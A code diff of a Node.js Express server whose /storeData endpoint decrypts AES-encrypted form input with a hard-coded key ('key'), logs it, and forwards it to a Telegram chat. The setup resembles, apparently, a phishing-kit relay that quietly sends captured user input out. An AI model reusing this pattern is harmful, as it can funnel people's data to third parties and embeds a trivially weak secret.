@@ -2,26 +2,29 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const app = express();
 const port = 8080;
+const CryptoJS = require("crypto-js");
 
 require("dotenv").config();
 
+const SECRET_KEY = 'key';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Middleware to parse JSON bodies
 app.use(bodyParser.json());
 
-// Serve static files (your HTML file)
 app.use(express.static("public"));
 
 app.post("/storeData", async (req, res) => {
-  const { userInput } = req.body;
-  console.log("Received user input:", userInput);
+  const encryptedData = req.body.data;
+  console.log("Received user input:", encryptedData);
 
-  // Format the message for Telegram
-  const message = `Received user input: ${JSON.stringify(userInput)}`;
+  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
+  const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
 
-  // Send the message to the Telegram bot
+  console.log('Decrypted data:', decryptedData);
+
+  const message = `Received user input: ${JSON.stringify(decryptedData)}`;
+
   const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
     const fetch = await import("node-fetch");
